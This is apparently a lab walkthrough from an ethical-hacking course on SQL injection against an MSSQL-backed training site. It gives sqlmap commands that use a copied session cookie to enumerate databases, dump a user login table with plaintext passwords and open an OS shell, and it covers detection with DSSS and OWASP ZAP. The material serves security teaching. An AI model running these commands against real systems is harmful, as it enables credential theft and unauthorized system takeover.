# SQL Injection

## Introduction

- SQL injection is a malicious technique exploiting input vulnerabilities to execute unauthorized SQL commands within a web application's backend database.

- SQL injection is a prevalent and severe attack, compromising data-driven web applications. Attackers exploit vulnerabilities in software, injecting malicious SQL queries to manipulate databases. These attacks target authentication, role validation, data storage, and linkage to other sources. Organizations facing SQL injection risk financial losses, reputation damage, and data/functionality compromise.

- As an ethical hacker or penetration tester, it's crucial to understand SQL injection techniques and deploy protective measures. Techniques include using prepared statements with bind parameters, input validation through whitelisting, and escaping user-supplied input. Input validation detects unauthorized input before passing it to SQL queries.

## Objective

- Understanding web application database connections
- Executing SQL injection on an MSSQL database
  - Extracting basic SQL injection flaws
  - Detecting SQL injection vulnerabilities

## Overview of SQL Injection

- SQL injection attacks encompass various techniques for viewing, manipulating, inserting, and deleting data. Three main types include:

---

| SQL Injection Type                  | Description                                                                                                           |
|-------------------------------------|-----------------------------------------------------------------------------------------------------------------------|
| In-band SQL Injection               | Attacker uses the same channel for both the attack and retrieving results. Commonly involves error-based or union-based attacks. |
| Blind/Inferential SQL Injection     | Attacker lacks system error messages; sends a malicious SQL query to the database without directly seeing the results. Commonly involves time-based or boolean-based attacks. |
| Out-of-Band SQL Injection           | Attacker uses different channels for the attack and retrieving results. Typically occurs when direct retrieval is not possible. Can involve techniques like DNS requests or HTTP requests for data extraction. |

---

## Tasks

#### 1. Perform SQL Injection Attacks
   - Perform SQL injection Attacks on an MSSQL Database
   - Perform SQL injection Attack against MSSQL to extract database using sqlmap 

### 2. Detect SQL vulnerabilities using Various SQL injection detection tools
   - Detect SQL vulnerabilities using DSSS 
   - Detect SQL vulnerabilities using OWASP ZAP

---
### 1. Perform SQL Injection Attacks

- In SQL injection attacks, a series of malicious SQL queries or statements are employed to manipulate the database of a web application or site.

- SQL injection poses a significant threat to all database-driven websites. This attack method targets normal websites or software packages based on their usage and data processing methods. SQL injection exploits weak codes in SQL databases lacking proper filtering, strong typing, or secure execution of user input. Exploiting this vulnerability enables attackers to execute database queries, leading to unauthorized access, modification of entries, or injection of malicious code, ultimately compromising sensitive data.

- SQL injection enables various attacks, including:

---

| Security Threat                   | Description                                                                                                                        |
|------------------------------------|------------------------------------------------------------------------------------------------------------------------------------|
| Authentication Bypass             | Attacker gains unauthorized access to an application by circumventing the authentication process, often acquiring administrative privileges. |
| Authorization Bypass              | Attacker manipulates stored authorization data in the database through SQL injection, gaining unauthorized access to resources.     |
| Information Disclosure            | Attacker retrieves sensitive information from the database, potentially exposing confidential data.                                |
| Compromised Data Integrity         | Attacker defaces webpages, inserts malicious content, or alters database contents, compromising the integrity of stored data.       |
| Compromised Availability of Data   | Attacker deletes specific information, logs, or audit details in a database, affecting the availability of data.                  |
| Remote Code Execution             | Attacker remotely executes code, potentially compromising the host OS and gaining control over the target system.                  |

---

#### Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap

- Microsoft SQL Server (MSSQL) is a relational database management system by Microsoft, serving the function of storing and retrieving data.

- We can utilize [sqlmap](https://www.kali.org/tools/sqlmap/), an open-source penetration testing tool, to automate the detection and exploitation of SQL injection flaws in MSSQL.

- Open Mozilla Firefox and navigate to http://www.moviescope.com/
- Create one account and login.
- Navigate to the View Profile tab, and note the URL in the address bar.
- Right-click on the webpage, select Inspect Element, and open the Console tab.
- Type `document.cookie` and copy the displayed cookie value.

- Run sqlmap with the following command:
    ```bash
    sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=l" --cookie="[copied cookie value]" --dbs
    ```

- Upon success, sqlmap will display information about MSSQL databases on the MovieScope website.
- Choose a database and retrieve its tables with the command:
    ```bash
    sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=l" --cookie="[copied cookie value]" -D moviescope --tables
    ```

- Dump the contents of the User_Login table:
    ```bash
    sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=l" --cookie="[copied cookie value]" -D moviescope -T User_Login --dump
    ```

- Review the retrieved user information, including usernames and plaintext passwords.
- Verify the login credentials by logging in with a user's details.
- Obtain an OS shell using:
    ```bash
    sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=l" --cookie="[copied cookie value]" --os-shell
    ```

- Follow the prompts to optimize DBMS delay responses and retrieve the hostname of the target machine.
- Explore further by running commands such as `TASKLIST` to view running tasks.
- For a list of available commands, type `help`.

### 2. Detect SQL Injection Vulnerabilities using Various SQL Injection Detection Tools

- SQL injection detection tools aid in identifying SQL injection attacks by monitoring HTTP traffic, SQL injection attack vectors, and assessing whether web applications or database code contain vulnerabilities. Developers play a crucial role in defending against SQL injection by configuring and developing applications securely. Best practices and countermeasures should be employed to prevent applications from succumbing to SQL injection attacks.

#### Detect SQL Injection Vulnerabilities using DSSS

- [Damn Small SQLi Scanner (DSSS)](https://github.com/stamparm/DSSS) is a highly functional SQL injection vulnerability scanner supporting both GET and POST parameters. Its capabilities extend to scanning web applications for various SQL injection vulnerabilities.

- Run DSSS and view available options:  
   ```bash
   python3 dsss.py -h
   ```

- Launch Firefox, and navigate to http://www.moviescope.com/ and login.

- View the Profile tab, note the URL, and inspect element as follows:
   - Right-click on the webpage, select Inspect Element.
   - Go to the Console tab, type `document.cookie`, and press Enter.

- Copy the cookie value, switch to the terminal, and execute DSSS with the following command:  
   ```bash
   python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[copied cookie value]"
   ```

- Review the scan result to identify SQL injection vulnerabilities.

- Copy the vulnerable website link from the result.

- Open a new Firefox tab, paste the link, and press Enter to confirm the vulnerability.

- Observe available user account information under the View Profile tab.

- Scroll down to view the user account information for all users.

#### Detect SQL Injection Vulnerabilities using OWASP ZAP

- OWASP Zed Attack Proxy (ZAP) is an integrated penetration testing tool designed for finding vulnerabilities in web applications. With automated scanners and manual testing tools, it caters to individuals with varying security experience levels.

- Launch OWASP ZAP, in the ZAP initialization prompt, select "No, I do not want to persist this session" and click Start.

- Under the Quick Start tab, click on Automated Scan.

- In the Automated Scan wizard, input the target website URL (e.g., http://www.moviescope.com) and click Attack.

- OWASP ZAP will perform an Active Scan on the target website.

- After completion, view the vulnerabilities found under the Alerts tab.

- Identify SQL Injection vulnerabilities; expand the SQL Injection node.

- Click on the discovered SQL Injection vulnerability to view details.

- Observe information such as Risk, Confidence, Parameter, and Attack under the discovered SQL Injection vulnerability.

- Risks are categorized by flag color: Red (High), Orange (Medium), Yellow (Low), Blue (Informational).

- You can also use other SQL injection detection tools such as [Acunetix Web Vulnerability Scanner](https://www.acunetix.com), [Snort](https://snort.org), [Burp Suite](https://www.portswigger.net), [w3af](https://w3af.org), to detect SQL injection vulnerabilities.
